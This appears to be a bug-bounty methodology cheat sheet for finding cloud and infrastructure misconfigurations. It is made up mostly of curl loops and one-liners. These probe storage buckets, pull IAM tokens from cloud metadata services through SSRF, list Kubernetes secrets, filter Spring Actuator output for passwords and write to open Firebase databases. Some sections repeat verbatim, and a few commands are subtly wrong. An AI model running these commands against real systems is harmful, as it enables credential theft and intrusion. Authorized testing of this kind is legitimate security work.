# CLOUD / INFRASTRUCTURE MISCONFIGURATIONS — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 16), telegram-intel, github-x-intel (H1 reports, bountyforge infra hunting), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Cloud storage (S3, GCS, Azure Blob, Firebase) — public read/write
[ ] 2. Compute metadata (EC2, GCP, Azure) — via SSRF
[ ] 3. Exposed admin panels (Jenkins, Grafana, Kibana, Elasticsearch, K8s, Spring Actuator)
[ ] 4. CI/CD exposure (Jenkins, CircleCI, GitLab, GitHub Actions)
[ ] 5. Kubernetes API — no auth = full cluster access
[ ] 6. Spring Actuators — /actuator/env, /actuator/heapdump
[ ] 6. Prove impact: data access, credentials, RCE = Critical
```

---

## CLOUD STORAGE

### AWS S3
```bash
# Public listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Common bucket names
for name in target target-backup target-assets target-prod target-staging target-dev target-test; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# S3 name brute (from wordlist)
for name in $(cat bucket-wordlist.txt); do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# S3 website endpoint
curl -s "https://target-bucket.s3-website-us-east-1.amazonaws.com/"

# Check bucket policy (if accessible)
aws s3api get-bucket-policy --bucket target-bucket-name --no-sign-request
```

### Google Cloud Storage (GCS)
```bash
# Public listing
curl -s "https://storage.googleapis.com/TARGET-BUCKET/"
curl -s "https://storage.googleapis.com/TARGET-BUCKET/?list"

# Try common names
for name in target target-backup target-assets target-prod; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://storage.googleapis.com/$name/"
done
```

### Azure Blob Storage
```bash
# Common pattern
for name in target target-backup target-assets target-prod; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.blob.core.windows.net/"
done

# List containers
curl -s "https://ACCOUNT.blob.core.windows.net/?comp=list"
```

### Firebase / Firestore
```bash
# Open read
curl -s "https://TARGET-APP.firebaseio.com/.json"

# Open write
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'

# Firestore (if open)
curl -s "https://firestore.googleapis.com/v1/projects/TARGET-APP/databases/(default)/documents"
```

---

## CLOUD METADATA (via SSRF)

### AWS EC2
```bash
# IAM role credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Instance metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# Requires: Metadata-Flavor: Google header for some endpoints
```

### Google Cloud Platform
```bash
# Metadata server (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# With header
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### Azure
```bash
# Instance Metadata Service (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# With header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

---

## EXPOSED ADMIN PANELS & SERVICES

### Quick Discovery
```bash
# Common paths
for path in jenkins grafana kibana elasticsearch swagger-ui.html phpMyAdmin .env config.json api-docs server-status actuator; do
  curl -s -o /dev/null -w "$path: %{http_code}\n" "https://target.com/$path"
done

# Subdomain enumeration
for sub in jenkins grafana kibana elasticsearch swagger phpmyadmin kibana elasticsearch grafana jenkins ci build buildkite travis drone portainer rancher argocd; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done
```

### Jenkins
```bash
# API access
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'

# Script console (RCE)
curl -s "https://jenkins.target.com/script"

# Credentials
curl -s "https://jenkins.target.com/credentials/" | grep -i "password\|token\|key"
```

### Grafana
```bash
# API access (often no auth)
curl -s "https://grafana.target.com/api/search" | jq '.[].title'
curl -s "https://grafana.target.com/api/dashboards/db/home" | jq '.dashboard.panels[].targets'

# Grafana dashboards often contain:
# - DB queries with credentials
# - Internal URLs
# - API keys
# - Credentials in variables
```

### Elasticsearch / Kibana
```bash
# Elasticsearch
curl -s "https://elasticsearch.target.com:9200/_cat/indices?v"
curl -s "https://elasticsearch.target.com:9200/_cluster/health"

# Kibana
curl -s "https://kibana.target.com/api/status"
```

### Kubernetes API
```bash
# API server (often on 6443 or 8443)
curl -sk "https://target.com:6443/api/v1/namespaces"
curl -sk "https://target.com:6443/api/v1/pods"
curl -sk "https://target.com:6443/api/v1/secrets"

# If 200 → full cluster access. No auth = Critical.
```

### Spring Actuators
```bash
# Environment (leaks secrets)
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key|token"))'

# Heapdump (analyze for secrets)
curl -s "https://target.com/actuator/heapdump" -o heapdump
# Analyze: jhat heapdump or Eclipse MAT

# Other endpoints
/actuator/health
/actuator/info
/actuator/metrics
/actuator/beans
/actuator/mappings
/actuator/threaddump
```

---

## CI/CD EXPOSURE

### Jenkins
```bash
# API
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'

# Script console (RCE)
curl -s "https://jenkins.target.com/script"

# Credentials
curl -s "https://jenkins.target.com/credentials/" | grep -i "password\|token\|key"
```

### CircleCI
```bash
# Project builds
curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO" | jq '.[0].build_num'

# Build output
curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO/BUILD_NUM" | jq '.steps[].actions[].output[]'
```

### GitLab CI
```bash
# Project CI config
curl -s "https://gitlab.target.com/api/v4/projects" | jq '.[].ci_config_path'

# Pipeline details
curl -s "https://gitlab.target.com/api/v4/projects/ID/pipelines" | jq '.[0]'
```

### GitHub Actions (Exposed)
```bash
# Public workflows
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Dangerous patterns
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# sisakulint
sisakulint scan .github/workflows/
```

---

## KUBERNETES & CONTAINER SECURITY

### Kubernetes API
```bash
# Check for exposed API
curl -sk "https://target.com:6443/api/v1/namespaces"
curl -sk "https://target.com:6443/api/v1/pods"
curl -sk "https://target.com:6443/api/v1/secrets"

# Kubelet (10250)
curl -sk "https://target.com:10250/pods"

# cAdvisor (4194)
curl -sk "https://target.com:4194/metrics"
```

### Container Registries
```bash
# Docker Registry v2
curl -s "https://registry.target.com/v2/_catalog"
curl -s "https://registry.target.com/v2/REPO/tags/list"

# Harbor
curl -s "https://harbor.target.com/api/v2.0/projects"
```

### Container Escape (If RCE in container)
```bash
# Check for privileged containers
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].securityContext.privileged}'

# HostPath mounts
kubectl get pods -A -o jsonpath='{.items[*].spec.volumes[*].hostPath.path}'

# Capabilities
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].securityContext.capabilities}'
```

---

## SPRING ACTUATORS

### Key Endpoints
```bash
# Environment (secrets)
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key|token|credential"))'

# Heapdump
curl -s "https://target.com/actuator/heapdump" -o heapdump
# Analyze: jhat heapdump or Eclipse MAT

# Other
/actuator/health
/actuator/info
/actuator/metrics
/actuator/beans
/actuator/mappings
/actuator/threaddump
/actuator/logfile
/actuator/auditevents
/actuator/httptrace
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$25,000** | Exposed Kubernetes API | Snapchat | No auth = full cluster |
| **$15,000** | Exposed Grafana | Snapchat | Dashboards with creds |
| **$18,000** | Exposed Spring Actuators | LY Corp | /actuator/env + heapdump |
| **$15,000** | Exposed Jenkins | Snapchat | Script console RCE |
| **$10,000** | Exposed proxy accesses internal Reddit | Reddit | SSRF/proxy misconfig |
| **$6,000** | Mozilla VPN RCE via path traversal | Mozilla | Path traversal → RCE |

---

## INFRASTRUCTURE HUNTING — H100 PATTERN ($10-25K per finding)

> Snapchat's 3 infrastructure reports averaged $13.3K each.

### Exposed CI/CD
```bash
# Jenkins
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'
curl -s "https://jenkins.target.com/script"  # Script console

# CircleCI
curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO" | jq '.[0].build_num'

# GitLab CI
curl -s "https://gitlab.target.com/api/v4/projects" | jq '.[].ci_config_path'

# Open build systems
for sub in jenkins ci build buildkite travis drone; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done
```

### Exposed Grafana (Snapchat $10K)
```bash
curl -s "https://grafana.target.com/api/search" | jq '.[].title'
curl -s "https://grafana.target.com/api/dashboards/db/home" | jq '.dashboard.panels[].targets'
# Dashboards contain: DB queries, internal URLs, API keys, credentials
```

### Exposed Kubernetes API (Snapchat $25K)
```bash
curl -sk "https://target.com:6443/api/v1/namespaces"
curl -sk "https://target.com:6443/api/v1/pods"
curl -sk "https://target.com:6443/api/v1/secrets"
# If 200 → full cluster access. No auth = Critical.
```

### Exposed Spring Actuators (LY Corp $18K)
```bash
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key|token"))'
curl -s "https://target.com/actuator/heapdump" -o heapdump
# Analyze: jhat heapdump or Eclipse MAT
```

---

## CLOUD-SPECIFIC ATTACKS

### AWS
```bash
# S3 enumeration
aws s3 ls s3://target-bucket --no-sign-request

# IAM enumeration (if creds)
aws iam list-users --no-sign-request
aws iam list-roles --no-sign-request

# CloudTrail (if public)
aws cloudtrail lookup-events --no-sign-request
```

### GCP
```bash
# Cloud Functions
curl -s "https://REGION-PROJECT.cloudfunctions.net/FUNCTION"

# Cloud Run
curl -s "https://SERVICE-HASH-REGION.run.app"

# IAM
gcloud projects get-iam-policy PROJECT --format=json
```

### Azure
```bash
# Key Vault
curl -H "Authorization: Bearer TOKEN" "https://VAULT.vault.azure.net/secrets?api-version=7.1"

# App Service
curl "https://APP.azurewebsites.net/api/health"
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$25,000** | Exposed Kubernetes API | Snapchat | No auth |
| **$15,000** | Exposed Grafana | Snapchat | Dashboards with creds |
| **$18,000** | Exposed Spring Actuators | LY Corp | /actuator/env |
| **$15,000** | Exposed Jenkins | Snapchat | Script console |
| **$10,000** | Exposed proxy → internal Reddit | Reddit | SSRF/proxy |
| **$6,000** | Mozilla VPN RCE | Mozilla | Path traversal |

---

## AUTOMATED TESTING (One-Liners)

```bash
# Cloud storage brute
for provider in s3.amazonaws.com storage.googleapis.com blob.core.windows.net; do
  for name in target target-backup target-assets target-prod target-staging target-dev; do
    curl -s -o /dev/null -w "$provider/$name: %{http_code}\n" "https://$name.$provider/"
  done
done

# Firebase
curl -s "https://TARGET.firebaseio.com/.json" | jq . 2>/dev/null && echo "OPEN"

# Admin panels
for panel in jenkins grafana kibana elasticsearch swagger-ui phpmyadmin actuator; do
  curl -s -o /dev/null -w "$panel: %{http_code}\n" "https://target.com/$panel"
done

# Subdomain admin panels
for sub in jenkins grafana kibana elasticsearch ci build buildkite travis drone portainer rancher argocd jenkins grafana; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done

# Kubernetes
curl -sk "https://target.com:6443/api/v1/namespaces" | jq . 2>/dev/null && echo "K8s API OPEN"

# Spring Actuators
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key|token"))' && echo "ACTUATOR OPEN"

# Jenkins
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name' 2>/dev/null && echo "JENKINS OPEN"

# Grafana
curl -s "https://grafana.target.com/api/search" | jq '.[].title' 2>/dev/null && echo "GRAFANA OPEN"

# Metadata via SSRF (test if SSRF exists)
for meta in "http://169.254.169.254/latest/meta-data/iam/security-credentials/" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"; do
  curl -s -H "Metadata-Flavor: Google" -H "Metadata: true" "$meta" | head -c 200
  echo "---"
done
```

---

## CHAINS THAT PAY

```
SSRF → Cloud metadata → IAM keys → S3/GCS access          → Critical
SSRF → Cloud metadata → IAM keys → IAM enumeration         → Critical
SSRF → Kubernetes API → secrets → cluster access          → Critical
SSRF → Spring Actuator /actuator/env → creds → ATO         → Critical
SSRF → Jenkins script console → RCE                        → Critical
SSRF → Grafana dashboards → DB creds / internal URLs       → Critical
SSRF → Jenkins / Grafana / K8s → internal network pivot    → Critical
Exposed K8s API → pod secrets → service accounts           → Critical
Exposed Grafana → DB queries with creds → data access      → Critical
Exposed Spring Actuator heapdump → memory analysis → keys  → Critical
Exposed Jenkins → script console → RCE                     → Critical
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Cloud storage brute
for provider in s3.amazonaws.com storage.googleapis.com blob.core.windows.net; do
  for name in target target-backup target-assets target-prod target-staging target-dev; do
    curl -s -o /dev/null -w "$provider/$name: %{http_code}\n" "https://$name.$provider/"
  done
done

# Firebase
curl -s "https://TARGET.firebaseio.com/.json" | jq . 2>/dev/null && echo "OPEN"

# Admin panels
for panel in jenkins grafana kibana elasticsearch swagger-ui phpmyadmin actuator; do
  curl -s -o /dev/null -w "$panel: %{http_code}\n" "https://target.com/$panel"
done

# Subdomain admin panels
for sub in jenkins grafana kibana elasticsearch ci build buildkite travis drone portainer rancher argocd; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done

# Kubernetes
curl -sk "https://target.com:6443/api/v1/namespaces" | jq . 2>/dev/null && echo "K8s API OPEN"

# Spring Actuators
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key|token"))' && echo "ACTUATOR OPEN"

# Jenkins
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name' 2>/dev/null && echo "JENKINS OPEN"

# Grafana
curl -s "https://grafana.target.com/api/search" | jq '.[].title' 2>/dev/null && echo "GRAFANA OPEN"

# Metadata via SSRF
for meta in "http://169.254.169.254/latest/meta-data/iam/security-credentials/" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"; do
  curl -s -H "Metadata-Flavor: Google" -H "Metadata: true" "$meta" | head -c 200
  echo "---"
done
```

---

## TRIAGE DECISION TREE

```
1. Is service exposed to internet?
   NO → Not an infra bug
   YES → Continue

2. Does it require auth?
   NO → Continue
   YES → Test default creds / weak auth

3. What access does it provide?
   - Data read (S3, Firebase, Grafana dashboards)    → High
   - Data write (S3 write, Firebase write)           → Critical
   - Credentials/keys (metadata, Actuator, Grafana)  → Critical
   - RCE (Jenkins script console, K8s API)           → Critical
   - Internal network access (K8s, proxy)            → Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Service requires auth & no default creds | Not vulnerable |
| Service on internal network only | Out of scope |
| Service requires VPN | Out of scope |
| Metadata service but no SSRF to reach it | Not directly exploitable |
| "Could access if..." without proof | Theoretical = N/A |
| Public bucket with only public files | Low/Info |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `aws` / `gcloud` / `az` | Cloud CLI enumeration |
| `kubectl` | Kubernetes enumeration |
| `curl` / `httpie` | HTTP testing |
| `awscli` | AWS enumeration |
| `gcloud` | GCP enumeration |
| `az` | Azure enumeration |
| `kubectl` | K8s enumeration |
| `helm` | Helm chart enumeration |
| `trivy` | Container image scanning |
| `kube-hunter` | K8s security hunting |
| `kube-bench` | K8s CIS benchmark |
| `prowler` | AWS security audit |
| `scoutsuite` | Multi-cloud security audit |
| `cloudsploit` | Cloud security scanning |
| `sisakulint` | GitHub Actions security audit |
| `nuclei` templates | Cloud/infra templates |
| `ffuf` | Subdomain/service fuzzing |
| `subfinder` / `amass` | Subdomain enumeration |
| `dnsx` | DNS enumeration |
| `httpx` | HTTP service discovery |
| `gau` / `waybackurls` | Historical endpoints |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 16 (S3, GCS, Azure, Firebase, EC2 metadata, admin panels)
- telegram-intel: @bugbountyresources 100 vuln categories
- github-x-intel: H1 reports (Snapchat $25k K8s, $15k Grafana, $15k Jenkins, $18k Spring Actuators, Reddit $10k proxy, Mozilla $6k); bountyforge infra hunting (Jenkins, Grafana, K8s, Spring Actuators, Snapchat pattern)
- bountyforge: Infrastructure hunting (Jenkins, Grafana, K8s, Spring Actuators), CI/CD exposure, cloud metadata via SSRF
- bb-methodology: Tactical Thinking (environment diff), Multi-Perspective (infra perspective)
- PortSwigger: Infrastructure labs
- HackTricks: Cloud/Infrastructure methodology
- Snapchat Bug Bounty: Infrastructure reports ($10-25K avg)
- AWS/GCP/Azure documentation: Metadata services, IAM
- Kubernetes documentation: API server, RBAC
- Spring Boot documentation: Actuator endpoints